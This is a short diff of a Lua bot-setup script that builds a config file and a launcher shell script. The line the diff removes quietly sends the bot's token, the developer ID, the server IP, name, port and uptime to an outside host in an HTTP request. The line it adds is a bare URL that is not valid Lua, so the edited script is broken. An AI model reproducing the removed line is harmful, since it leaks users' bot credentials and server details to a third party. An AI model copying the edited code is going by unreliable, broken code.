@@ -66,7 +66,7 @@ TrOn = DevRio:get(Server.."TokenTrOn"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdTrOn")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=TrOn&DevId="..DevRio:get(Server.."IdTrOn").."&TokenBot="..DevRio:get(Server.."TokenTrOn").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+http://klanrplay.ml/tronteam0/tronteam0.php
 file = io.open("TrOn.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
